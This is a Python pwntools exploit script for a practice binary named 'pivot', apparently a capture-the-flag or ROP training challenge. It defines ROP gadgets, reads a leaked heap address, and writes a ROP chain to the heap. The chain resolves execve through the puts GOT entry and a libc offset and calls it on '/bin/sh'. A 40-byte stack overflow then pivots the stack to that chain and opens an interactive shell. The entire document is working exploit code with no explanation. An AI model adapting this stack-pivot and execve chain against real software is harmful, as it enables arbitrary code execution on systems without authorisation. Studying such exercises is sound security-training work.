from pwn import *
import re

pop_rax = p64(0x0000000000400b00)         # pop rax; ret;
xchg_rax_rsp = p64(0x0000000000400b02)    # xchg rax, rsp; ret;
mov_rax_ptr_rax = p64(0x0000000000400b05) # mov rax, qword ptr [rax]; ret;
jmp_rax = p64(0x00000000004008f5)         # jmp rax;
pop_rbp = p64(0x0000000000400900)         # pop rbp; ret;
add_rax_rbp = p64(0x0000000000400b09)     # add rax, rbp; ret;
call_rax = p64(0x000000000040098e)        # call rax;
pop_rdi = p64(0x0000000000400b73)         # pop rdi; ret;
push_rbp_mov_rbp_rsp_call_rax = p64(0x000000000040098a) # push rbp; mov rbp, rsp; call rax;
mov_rbp_rsp_call_rax = p64(0x000000000040098b) # mov rbp, rsp; call rax;
leave = p64(0x0000000000400a39)                # leave; ret;
pop_13_14_15 = p64(0x0000000000400b6e)         # pop r13; pop r14; pop r15; ret;
pop_rsi_14 = p64(0x0000000000400b71)           # pop rsi; pop r15; ret;

binsh = "/bin/sh\x00"

execve = 0x7ffff78c6e30
puts = 0x7ffff78629c0
exec_offset = execve - puts # 0x64470

puts_plt = p64(0x0000000000400800)
puts_got = p64(0x602020)

def JumpToHeap(heap_addr):
  ret  = ""
  ret += pop_rax
  ret += p64(heap_addr)
  ret += xchg_rax_rsp
  return ret

def Callexecve():
  ret = ""
  ret += pop_rsi_14   # used to move rsp
  ret += binsh        # for rdi
  ret += p64(0x0)     # for rsi (later)

  ret += pop_rax      # Set up rax to point to execve
  ret += puts_got
  ret += mov_rax_ptr_rax
  ret += pop_rbp
  ret += p64(exec_offset)
  ret += add_rax_rbp

  ret += pop_rdi
  ret += p64(heap + 0x8) # get binsh into rdi
  ret += pop_rsi_14  # pop 0x0 from before into rsi
  ret += p64(heap + 0x10)
  ret += p64(0x0) # for r14

  ret += call_rax
  return ret

elf = ELF('pivot')

io = process(elf.path)
leaked = io.recvuntil("> ")

# Get leak
hexreg = "0[xX][0-9a-fA-F]+"
m = re.search(hexreg, leaked)
heap = int(m.group(), 16)

pad = 'A'*40

info("heap addr: " + hex(heap))

# for stack
rops = pad + JumpToHeap(heap)

# for heap
roph = Callexecve()

io.sendline(roph)
leaked = io.recvuntil("> ")
io.sendline(rops)

io.interactive()
